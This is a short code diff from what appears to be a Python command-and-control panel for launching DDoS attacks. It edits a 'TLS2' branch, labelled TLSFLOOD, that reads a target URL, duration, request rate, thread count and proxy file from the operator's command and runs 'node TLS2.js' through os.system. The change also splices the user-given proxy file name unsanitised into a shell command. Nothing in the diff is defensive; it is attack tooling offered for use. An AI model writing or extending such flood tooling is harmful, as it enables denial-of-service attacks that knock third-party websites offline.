@@ -96,20 +96,21 @@ def main():
                 print('Usage: METHOD URL TIME');
                 print('Example: METHOD URL TIME');
                 
- elif "TLS2" in cnc:  # TLSFLOOD
-            try:
-                target = cnc.split()[1]
-                time = cnc.split()[2]
-                Rate = cnc.split()[3]
-                threads = cnc.split()[4]
-                proxyFile = cnc.split()[5]
-                os.system(f'node TLS2.js {target} {time} {Rate} {threads} proxy.txt')
-            except IndexError:
-                print('Usage: TLS2 <Target> <Time> <Rate> <threads> ')
-                print('Example: TLS2 https://example.com 120 512 1000')
-                print(' Tls-Flood ') 
    
-   
+elif "TLS2" in cnc:
+    try:
+        host = cnc.split()[1]
+        time = cnc.split()[2]
+        Rate = cnc.split()[3]
+        threads = cnc.split()[4]
+        proxyFile = cnc.split()[5]
+        os.system(f'node TLS2.js {host} {time} {Rate} {threads} {proxyFile}')
+    except IndexError:
+        print('Usage: TLS2 <host> <Time> <Rate> <threads>')
+        print('Example: TLS2 https://example.com 120 512 1000')
+
+
+
    
            elif "SKYNET" in cnc:  # SKYNET
             try:
